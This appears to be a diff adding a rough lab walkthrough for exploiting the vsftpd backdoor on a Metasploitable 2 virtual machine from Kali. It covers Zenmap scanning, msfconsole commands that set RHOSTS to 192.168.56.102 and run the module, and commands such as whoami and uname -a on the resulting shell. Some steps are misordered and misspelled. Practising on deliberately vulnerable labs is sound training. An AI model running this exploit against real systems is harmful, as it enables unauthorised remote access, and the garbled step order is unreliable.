@@ -1,0 +1,30 @@
+
+
+if not have Metasploit 2 ( https://sourceforge.net/projects/metasploitable/ ) goa and download after that open  oracle virtual box in tat open Metasploit then type ifcofig ->command
+then ping will pop up copy to kali open kali and type ifconfig -> command then , ping 192.168.56.102 -> from Metasploit ip adrr then comtrol +z to exit then step 1
+open zenmap then type in target ip adrr  192.168.56.102 then go to profile choosee- ( quack scan plus) then click scan then wait you will connect the metasploi in kali  
+
+
+ step 1 -  open kali type - msfconsole   <- command , then 
+
+step 2 -  then type-   search vsftpd  <-command ,
+
+ step 3 - then type - set RHOSTS 192.168.56.102 <- command ,
+
+ step 4 -   then type - run <- command ,
+
+step 5 - tehn type - use 1  <- command ,
+
+step 6 -  then type - set RHOSTS 192.168.56.102 <- command ,
+
+step 7 - then type -  run <- command ,
+
+step 8 - then type - whoami <- command ,
+
+step 9 - then type - uname -a <- command ,
+
+step 10 - then type - ls <- command ,<---- you will get out put
+ 
+step 11 - then type - exit <- command ,
+
+step 12 - then again type - exit <- command ,  
